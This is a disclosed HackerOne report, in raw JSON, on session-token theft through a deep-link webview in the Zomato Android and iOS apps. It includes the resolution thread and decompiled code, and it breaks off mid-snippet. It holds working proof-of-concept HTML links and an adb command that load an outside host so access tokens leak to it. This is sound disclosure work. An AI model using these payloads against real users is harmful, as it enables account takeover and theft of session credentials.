{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-06-06T18:23:50.843Z", 
    "voters": [
        "spam404", 
        "hunter", 
        "gerben_javado", 
        "bhavukjain1", 
        "emitrani", 
        "inhibitor181", 
        "asad0x01_", 
        "eveeez", 
        "ischleep", 
        "lincoln9932", 
        "and 23 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "650.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 328486, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-06-17T17:34:36.949Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "[Zomato Android/iOS] Theft of user session", 
    "is_member_of_team?": null, 
    "vote_count": 33, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "com.application.zomato", 
        "max_severity": "critical", 
        "databaseId": 387, 
        "asset_type": "GOOGLE_PLAY_APP_ID"
    }, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$650", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-03-21T23:26:55.978Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-21T23:28:26.731Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Please edit the title to ``` [Zomato iOS/Android] Theft of user session ``` \ud83d\ude0e\nI was able to reproduce the same behaviour on iOS too with the following link\n```html\n\t<h1><a href=\"zomato://webview/?url=http://base64.ru/\">Begin zaheck!</a></h1>\n```\nVideo:\n{F277445}\n\nTokens:\n{F277446}", 
            "markdown_message": "<p>Please edit the title to <code>[Zomato iOS/Android] Theft of user session</code> \ud83d\ude0e<br>\nI was able to reproduce the same behaviour on iOS too with the following link</p>\n<pre class=\"highlight html\"><code>    <span class=\"nt\">&lt;h1&gt;&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;zomato://webview/?url=http://base64.ru/&quot;</span><span class=\"nt\">&gt;</span>Begin zaheck!<span class=\"nt\">&lt;/a&gt;&lt;/h1&gt;</span>\n</code></pre>\n<p>Video:<br>\n{F277445}</p>\n\n<p>Tokens:<br>\n{F277446}</p>\n", 
            "type": "Activities::Comment", 
            "id": 2516435, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-22T06:07:19.574Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-22T06:07:19.574Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Good one @bagipro, in this specific webview, the default case allows you to load any webpage and thus it leaks the `access tokens` to external sites.\n\nWe'll get back to you once we have any updates. Keep Hunting :)\n\nThanks. Cheers :)", 
            "markdown_message": "<p>Good one <a href=\"/bagipro\">@bagipro</a>, in this specific webview, the default case allows you to load any webpage and thus it leaks the <code>access tokens</code> to external sites.</p>\n\n<p>We&#39;ll get back to you once we have any updates. Keep Hunting :)</p>\n\n<p>Thanks. Cheers :)</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 2516737, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-22T06:07:47.796Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-22T06:07:47.796Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_title": "[Zomato Android/iOS] Theft of user session", 
                "old_title": "[Zomato Android] Theft of user session"
            }, 
            "team_handle": "zomato", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportTitleUpdated", 
            "id": 2516738, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-22T16:46:40.461Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-22T16:46:40.461Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \nBut if you\u2019re going to validate host now, don\u2019t forget to validate also authority part and scheme ", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\nBut if you\u2019re going to validate host now, don\u2019t forget to validate also authority part and scheme </p>\n", 
            "type": "Activities::Comment", 
            "id": 2518755, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-27T11:54:00.752Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-27T11:54:00.752Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Hey @bagipro \n\nHope you're doing well. We have rolled out a fix, can you please delete the current version of the app and download the latest one from `Google Play Store` and confirm the fix?\n\nNote: For iOS, we haven't yet rolled out a fix yet. It's only for the Android Version.\n\nCheers.", 
            "markdown_message": "<p>Hey <a href=\"/bagipro\">@bagipro</a> </p>\n\n<p>Hope you&#39;re doing well. We have rolled out a fix, can you please delete the current version of the app and download the latest one from <code>Google Play Store</code> and confirm the fix?</p>\n\n<p>Note: For iOS, we haven&#39;t yet rolled out a fix yet. It&#39;s only for the Android Version.</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 2672296, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-27T12:37:22.179Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-27T12:37:22.179Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \nFixed, but I would recommend to update all loading links to HTTPS, because tokens still can be leaked via HTTP:\n{F290862}\n\nusing that PoC\n```\nadb shell am start -n com.application.zomato/.activities.DeepLinkRouter -a android.intent.action.VIEW -d \"zomato://treatswebview/?url=http://www.zomato.com/&navigation_bar_title=wow\"\n```", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\nFixed, but I would recommend to update all loading links to HTTPS, because tokens still can be leaked via HTTP:<br>\n{F290862}</p>\n\n<p>using that PoC</p>\n<pre class=\"highlight plaintext\"><code>adb shell am start -n com.application.zomato/.activities.DeepLinkRouter -a android.intent.action.VIEW -d &quot;zomato://treatswebview/?url=http://www.zomato.com/&amp;navigation_bar_title=wow&quot;\n</code></pre>", 
            "type": "Activities::BugNew", 
            "id": 2672367, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-04-27T12:44:22.709Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-04-27T12:44:22.709Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Yeah, I see your point. thanks :) will get this sorted too.\n\nCheers.", 
            "markdown_message": "<p>Yeah, I see your point. thanks :) will get this sorted too.</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 2672387, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-15T15:47:07.579Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-15T15:47:07.579Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \nAndroid app was fixed in the latest release. iOS not yet", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\nAndroid app was fixed in the latest release. iOS not yet</p>\n", 
            "type": "Activities::Comment", 
            "id": 2746997, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-15T16:10:15.464Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-15T16:10:15.464Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@bagipro yeah in iOS too it should be fixed in a day or two.\n\nCheers.", 
            "markdown_message": "<p><a href=\"/bagipro\">@bagipro</a> yeah in iOS too it should be fixed in a day or two.</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2747103, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-21T11:44:49.696Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-21T11:44:49.696Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \niOS app was updated this morning, but the bug seems to be not completely fixed. PoC:\n```html\n<!DOCTYPE html>\n<html>\n<head><title>Zaheck page</title></head>\n<body style=\"text-align: center;\">\n    <h1><a href=\"https://zoma.to/webview?url=http://base64.ru/&navigation_bar_title=wow\">Begin zaheck!</a></h1>\n</body>\n</html>\n```\n\nThe check wasn't added for this deeplink URL, so tokens are leaked here too", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\niOS app was updated this morning, but the bug seems to be not completely fixed. PoC:</p>\n<pre class=\"highlight html\"><code><span class=\"cp\">&lt;!DOCTYPE html&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;head&gt;&lt;title&gt;</span>Zaheck page<span class=\"nt\">&lt;/title&gt;&lt;/head&gt;</span>\n<span class=\"nt\">&lt;body</span> <span class=\"na\">style=</span><span class=\"s\">&quot;text-align: center;&quot;</span><span class=\"nt\">&gt;</span>\n    <span class=\"nt\">&lt;h1&gt;&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;https://zoma.to/webview?url=http://base64.ru/&amp;navigation_bar_title=wow&quot;</span><span class=\"nt\">&gt;</span>Begin zaheck!<span class=\"nt\">&lt;/a&gt;&lt;/h1&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>The check wasn&#39;t added for this deeplink URL, so tokens are leaked here too</p>\n", 
            "type": "Activities::Comment", 
            "id": 2773739, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-21T11:58:03.830Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-21T11:58:03.830Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Hey @bagipro Can you please confirm if you have the latest version of the app? I just tried to replicate it and it works perfectly fine, is it possible to help us with a VIDEO POC, also check the app version, if you have `12.1.1`?\n\nCheers.", 
            "markdown_message": "<p>Hey <a href=\"/bagipro\">@bagipro</a> Can you please confirm if you have the latest version of the app? I just tried to replicate it and it works perfectly fine, is it possible to help us with a VIDEO POC, also check the app version, if you have <code>12.1.1</code>?</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2773755, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-21T12:03:36.948Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-21T12:03:36.948Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \nYes, the latest one. Please open this page on your iOS device https://s3.amazonaws.com/zomatotestbucket/zzz.html and tap on Begin Zaheck", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\nYes, the latest one. Please open this page on your iOS device <a title=\"https://s3.amazonaws.com/zomatotestbucket/zzz.html\" href=\"/redirect?signature=2d99a6cbd517fba30c586665f5cfa7ab10dd35a0&amp;url=https%3A%2F%2Fs3.amazonaws.com%2Fzomatotestbucket%2Fzzz.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://s3.amazonaws.com/zomatotestbucket/zzz.html</span><i class=\"icon-external-link\"></i></a> and tap on Begin Zaheck</p>\n", 
            "type": "Activities::Comment", 
            "id": 2773773, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-21T12:20:58.577Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-21T12:21:39.330Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Got it :) Thanks @bagipro, you've been quite helpful. And apologies for keeping you wait.\n\nIn the meantime, I'll reward bounties on the other 2 reports tomorrow, and would reward this one, once the fix has been rolled out (though this one is the most impactful one).\n\nCheers.", 
            "markdown_message": "<p>Got it :) Thanks <a href=\"/bagipro\">@bagipro</a>, you&#39;ve been quite helpful. And apologies for keeping you wait.</p>\n\n<p>In the meantime, I&#39;ll reward bounties on the other 2 reports tomorrow, and would reward this one, once the fix has been rolled out (though this one is the most impactful one).</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2773791, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2018-05-21T13:39:04.634Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-21T13:39:04.634Z", 
            "actor": {
                "url": "/zomato", 
                "profile": {
                    "name": "Zomato"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/943/dbb71f3e2a0e73fe819c0c2a3e4fbcdd24d138e9_medium.png?1526447675"
                }
            }, 
            "team_handle": "zomato", 
            "bonus_amount": "150.0", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "bagipro", 
                "url": "/bagipro"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 2773937, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-05-21T13:40:05.417Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-05-21T13:40:05.417Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \nThanks!", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\nThanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 2773938, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-06T07:22:13.304Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-06T07:22:13.304Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \nFixed in new iOS release", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\nFixed in new iOS release</p>\n", 
            "type": "Activities::Comment", 
            "id": 2848174, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bagipro", 
                "url": "/bagipro"
            }, 
            "created_at": "2018-06-06T07:31:23.915Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-06T07:31:23.915Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "Awesome, thanks for helping us keep @zomato secure :)\n\nIn case you want this to disclose to public so that they can learn something out of it, can you write up a detailed summary about this (redacting confidential info) and we can go ahead and do limited public disclosure? ", 
            "markdown_message": "<p>Awesome, thanks for helping us keep <a href=\"/zomato\">@zomato</a> secure :)</p>\n\n<p>In case you want this to disclose to public so that they can learn something out of it, can you write up a detailed summary about this (redacting confidential info) and we can go ahead and do limited public disclosure? </p>\n", 
            "type": "Activities::BugResolved", 
            "id": 2848191, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-06T10:14:41.517Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-06T10:14:41.517Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@prateek_0490-zomato \nLet's do full disclosure? We didn't publish anything sensitive, and anyway write-up will be 100% copy-paste from the initial report", 
            "markdown_message": "<p><a href=\"/prateek_0490-zomato\">@prateek_0490-zomato</a> <br>\nLet&#39;s do full disclosure? We didn&#39;t publish anything sensitive, and anyway write-up will be 100% copy-paste from the initial report</p>\n", 
            "type": "Activities::Comment", 
            "id": 2849275, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-06T18:23:50.879Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-06T18:23:50.879Z", 
            "actor": {
                "username": "bagipro", 
                "url": "/bagipro", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2850961, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-17T17:34:36.978Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-17T17:34:36.978Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "@bagipro - Apologies for the delay, disclosing it now. Thanks for helping us keep @zomato secure :)\n\nCheers.", 
            "markdown_message": "<p><a href=\"/bagipro\">@bagipro</a> - Apologies for the delay, disclosing it now. Thanks for helping us keep <a href=\"/zomato\">@zomato</a> secure :)</p>\n\n<p>Cheers.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2896920, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-06-17T17:34:37.105Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-06-17T17:34:37.105Z", 
            "actor": {
                "username": "prateek_0490-zomato", 
                "url": "/prateek_0490-zomato", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/250/599/51a304a7bad58ad6f5fefcada5ae92b8b93168ce_medium.png?1521371856"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "zomato", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2896921, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "bagipro", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bagipro", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/052/239/4da99970bfc1e4897f003883d05dc8acfec556ef_small.jpg?1510530490"
        }, 
        "is_me?": false
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2018-06-17T17:34:37.074Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/328486", 
    "created_at": "2018-03-21T22:53:57.314Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi, I&#39;d like to report a bug which allows to theft user data even without installing third-party apps.</p>\n\n<p>Activity </p>\n<pre class=\"highlight xml\"><code>        <span class=\"nt\">&lt;activity</span> <span class=\"na\">android:theme=</span><span class=\"s\">&quot;@style/ZomatoTranslucentTheme&quot;</span> <span class=\"na\">android:label=</span><span class=\"s\">&quot;@string/app_name&quot;</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;com.application.zomato.activities.DeepLinkRouter&quot;</span> <span class=\"na\">android:screenOrientation=</span><span class=\"s\">&quot;portrait&quot;</span><span class=\"nt\">&gt;</span>\n            <span class=\"nt\">&lt;intent-filter&gt;</span>\n                <span class=\"nt\">&lt;action</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.action.VIEW&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.DEFAULT&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;category</span> <span class=\"na\">android:name=</span><span class=\"s\">&quot;android.intent.category.BROWSABLE&quot;</span><span class=\"nt\">/&gt;</span>\n                <span class=\"nt\">&lt;data</span> <span class=\"na\">android:scheme=</span><span class=\"s\">&quot;zomato&quot;</span><span class=\"nt\">/&gt;</span>\n            <span class=\"nt\">&lt;/intent-filter&gt;</span>\n        <span class=\"nt\">&lt;/activity&gt;</span>\n</code></pre>\n<p>is exported, and can be accessed by browser. When any WebView (in a client app, or a browser) meets a <code>zomato://etc</code> URL it will automatically launch Zomato app.</p>\n\n<p>File <code>com/application/zomato/activities/DeepLinkRouter.java</code></p>\n<pre class=\"highlight java\"><code>            <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(!(</span><span class=\"n\">getIntent</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getAction</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"o\">!</span><span class=\"s\">&quot;android.intent.action.VIEW&quot;</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getAction</span><span class=\"o\">())))</span> <span class=\"o\">{</span>\n                <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">c</span> <span class=\"o\">=</span> <span class=\"n\">getIntent</span><span class=\"o\">().</span><span class=\"na\">getData</span><span class=\"o\">().</span><span class=\"na\">toString</span><span class=\"o\">();</span> <span class=\"c1\">// getting zomato://etc URL</span>\n            <span class=\"o\">}</span>\n            <span class=\"n\">c</span><span class=\"o\">(</span><span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">c</span><span class=\"o\">);</span>\n</code></pre><pre class=\"highlight java\"><code>        <span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">c</span><span class=\"o\">(</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">String</span> <span class=\"n\">str</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"kt\">boolean</span> <span class=\"n\">z</span> <span class=\"o\">=</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n            <span class=\"kt\">boolean</span> <span class=\"n\">z2</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n            <span class=\"k\">try</span> <span class=\"o\">{</span>\n                <span class=\"n\">android</span><span class=\"o\">.</span><span class=\"na\">net</span><span class=\"o\">.</span><span class=\"na\">Uri</span> <span class=\"n\">parse</span> <span class=\"o\">=</span> <span class=\"n\">android</span><span class=\"o\">.</span><span class=\"na\">net</span><span class=\"o\">.</span><span class=\"na\">Uri</span><span class=\"o\">.</span><span class=\"na\">parse</span><span class=\"o\">(</span><span class=\"n\">str</span><span class=\"o\">);</span>\n                <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"s\">&quot;zomato&quot;</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">parse</span><span class=\"o\">.</span><span class=\"na\">getScheme</span><span class=\"o\">())</span> <span class=\"o\">||</span> <span class=\"s\">&quot;zomatodelivery&quot;</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">parse</span><span class=\"o\">.</span><span class=\"na\">getScheme</span><span class=\"o\">()))</span> <span class=\"o\">{</span>\n                    <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">util</span><span class=\"o\">.</span><span class=\"na\">List</span> <span class=\"n\">pathSegments</span><span class=\"o\">;</span>\n                    <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">String</span> <span class=\"n\">host</span> <span class=\"o\">=</span> <span class=\"n\">parse</span><span class=\"o\">.</span><span class=\"na\">getHost</span><span class=\"o\">();</span>\n</code></pre><pre class=\"highlight java\"><code>                                    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"s\">&quot;treatswebview&quot;</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">host</span><span class=\"o\">))</span> 